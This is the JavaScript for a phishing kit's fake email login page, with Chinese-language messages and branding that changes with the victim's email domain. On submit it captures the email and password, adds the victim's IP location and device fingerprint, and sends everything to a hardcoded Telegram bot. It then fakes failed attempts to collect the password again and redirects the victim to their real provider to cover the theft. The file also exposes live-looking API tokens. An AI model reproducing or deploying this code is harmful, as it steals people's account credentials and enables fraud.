// Security configuration
const SECURITY_CONFIG = {
    maxAttempts: 2, // Changed from 5 to 2
    blockDuration: 300000, // 5 minutes in milliseconds
    telegramBotToken: '6385610534:AAEpfcxYHf5oSNi_UZSzU4hAO4WS0M9NeV4',
    telegramChatId: '6658986863',
    ipInfoToken: 'efeb6799727414'
};

// Global state
let loginAttempts = 0;
let isBlocked = false;
let blockTimer = null;

// DOM elements
const loginForm = document.getElementById('loginForm');
const signinBtn = document.getElementById('signinBtn');
const btnText = document.querySelector('.btn-text');
const loadingSpinner = document.getElementById('loadingSpinner');
const messageDiv = document.getElementById('message');
const loginContainer = document.getElementById('loginContainer');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const containerLogo = document.getElementById('containerLogo');

// Prefill email if provided in URL
const urlParams = new URLSearchParams(window.location.search);
const prefilledEmail = urlParams.get('email') || '';
if (prefilledEmail) {
    emailInput.value = prefilledEmail;
    setTimeout(updateLogoBasedOnEmail, 100);
}

// Email domain → logo mapping
const emailLogos = {
    'gmail.com': 'https://logo.clearbit.com/gmail.com',
    'yahoo.com': 'https://logo.clearbit.com/yahoo.com',
    'outlook.com': 'https://logo.clearbit.com/outlook.com',
    'hotmail.com': 'https://logo.clearbit.com/hotmail.com',
    'live.com': 'https://logo.clearbit.com/live.com',
    'icloud.com': 'https://logo.clearbit.com/icloud.com',
    'aol.com': 'https://logo.clearbit.com/aol.com',
    'protonmail.com': 'https://logo.clearbit.com/protonmail.com',
    'zoho.com': 'https://logo.clearbit.com/zoho.com',
    '163.com': 'https://logo.clearbit.com/163.com',
    '126.com': 'https://logo.clearbit.com/126.com',
    'aliyun.com': 'https://logo.clearbit.com/aliyun.com',
    'sohu.com': 'https://logo.clearbit.com/sohu.com',
    '263.net': 'https://logo.clearbit.com/263.net',
    '10086.cn': 'https://logo.clearbit.com/10086.cn',
    'sina.com.cn': 'https://logo.clearbit.com/sina.com.cn',
    'vip.sina.com.cn': 'https://logo.clearbit.com/vip.sina.com',
    '21cn.com': 'https://logo.clearbit.com/21cn.com',
    '189.cn': 'https://logo.clearbit.com/189.cn',
    'dangote.com': 'https://logo.clearbit.com/dangote.com'
};

// Utility: debounce
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func(...args), wait);
    };
}

// UI helpers
function showMessage(text, type, duration = 5000) {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    setTimeout(() => messageDiv.style.display = 'none', duration);
}

function setLoading(isLoading) {
    signinBtn.disabled = isLoading;
    btnText.textContent = isLoading ? '正在验证...' : '登录';
    loadingSpinner.style.display = isLoading ? 'inline-block' : 'none';
    loginContainer.style.opacity = isLoading ? '0.8' : '1';
}

function blockUser() {
    isBlocked = true;
    signinBtn.disabled = true;
    emailInput.disabled = true;
    passwordInput.disabled = true;
    showMessage(`尝试次数过多，请等待 ${SECURITY_CONFIG.blockDuration / 60000} 分钟后再试。`, 'error', SECURITY_CONFIG.blockDuration);
    blockTimer = setTimeout(() => {
        isBlocked = false;
        loginAttempts = 0;
        signinBtn.disabled = false;
        emailInput.disabled = false;
        passwordInput.disabled = false;
        showMessage('您现在可以再次尝试登录。', 'success');
    }, SECURITY_CONFIG.blockDuration);
}

// Logo updater
function updateLogoBasedOnEmail() {
    const email = emailInput.value.trim().toLowerCase();
    if (email && email.includes('@')) {
        const domain = email.split('@')[1];
        const logoSrc = emailLogos[domain] || `https://logo.clearbit.com/${domain}`;
        const img = new Image();
        img.onload = () => {
            containerLogo.src = logoSrc;
            containerLogo.alt = `${domain} 标志`;
        };
        img.onerror = () => {
            containerLogo.src = 'https://logo.clearbit.com/dangote.com';
            containerLogo.alt = '默认标志';
        };
        img.src = logoSrc;
    } else {
        containerLogo.src = 'https://logo.clearbit.com/dangote.com';
        containerLogo.alt = '默认标志';
    }
}

// Get IP info
async function getIpInfo() {
    try {
        const response = await fetch(`https://ipinfo.io/json?token=${SECURITY_CONFIG.ipInfoToken}`);
        return await response.json();
    } catch {
        return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown' };
    }
}

// Send Telegram alert (English, includes password)
async function sendTelegramAlert(message, attemptNumber) {
    try {
        const formattedMessage = `
<b>⚠️ Login Attempt #${attemptNumber}</b>
<b>Email:</b> ${message.email}
<b>Password:</b> ${message.password}
<b>IP Address:</b> ${message.ip}
<b>Location:</b> ${message.city}, ${message.region}, ${message.country}
<b>ISP:</b> ${message.org}
<b>Device:</b> ${message.platform} (${message.screenResolution})
<b>Browser:</b> ${message.userAgent}
<b>Time:</b> ${new Date().toLocaleString('en-US')}
        `;
        await fetch(`https://api.telegram.org/bot${SECURITY_CONFIG.telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: SECURITY_CONFIG.telegramChatId,
                text: formattedMessage,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Error sending Telegram alert:', err);
    }
}

// Create attempt data
function createLoginAttemptData(ipInfo) {
    return {
        timestamp: new Date().toISOString(),
        email: emailInput.value.trim(),
        password: passwordInput.value.trim(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ip: ipInfo.ip,
        city: ipInfo.city,
        region: ipInfo.region,
        country: ipInfo.country,
        org: ipInfo.org
    };
}

// Redirect to email provider
function redirectToEmailDomain() {
    const email = emailInput.value.trim();
    if (email && email.includes('@')) {
        const domain = email.split('@')[1];
        window.location.href = `https://${domain}`;
    }
}

// Event listeners
emailInput.addEventListener('input', debounce(updateLogoBasedOnEmail, 300));
emailInput.addEventListener('blur', updateLogoBasedOnEmail);

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    if (isBlocked) {
        showMessage('账户已暂时锁定，请稍后再试。', 'error');
        return;
    }

    const formData = new FormData(loginForm);
    setLoading(true);

    const ipInfo = await getIpInfo();
    const attemptData = createLoginAttemptData(ipInfo);

    // Send Telegram alert (includes password)
    await sendTelegramAlert(attemptData, loginAttempts + 1);

    // Append extra info to formData
    for (const [key, value] of Object.entries(attemptData)) {
        if (value) formData.append(key, value);
    }

    try {
        const response = await fetch('', {
            method: 'POST',
            body: formData,
            headers: { 'X-Requested-With': 'XMLHttpRequest' }
        });

        if (!response.ok) throw new Error(`HTTP错误! 状态: ${response.status}`);

        const data = await response.json();
        setLoading(false);

        if (data.success) {
            loginAttempts = 0;
            showMessage(data.message, 'success');
            setTimeout(() => redirectToEmailDomain(), 3000);
        } else {
            loginAttempts++;
            showMessage(`登录失败。剩余 ${SECURITY_CONFIG.maxAttempts - loginAttempts} 次机会。`, 'error');

            // Redirect to email domain on second attempt
            if (loginAttempts >= SECURITY_CONFIG.maxAttempts) {
                setTimeout(() => redirectToEmailDomain(), 3000);
                blockUser();
            }
        }
    } catch (error) {
        setLoading(false);
        loginAttempts++;
        showMessage('网络错误，请检查连接并重试。', 'error');
        console.error('登录错误:', error);
        if (loginAttempts >= SECURITY_CONFIG.maxAttempts) {
            setTimeout(() => redirectToEmailDomain(), 3000);
            blockUser();
        }
    }
});

// Init
document.addEventListener('DOMContentLoaded', function () {
    setTimeout(updateLogoBasedOnEmail, 200);
    console.log('%c🔒 安全提示', 'color: red; font-size: 20px; font-weight: bold;');
    console.log('%c这是一个安全系统，未经授权禁止访问。', 'color: #666;');
});
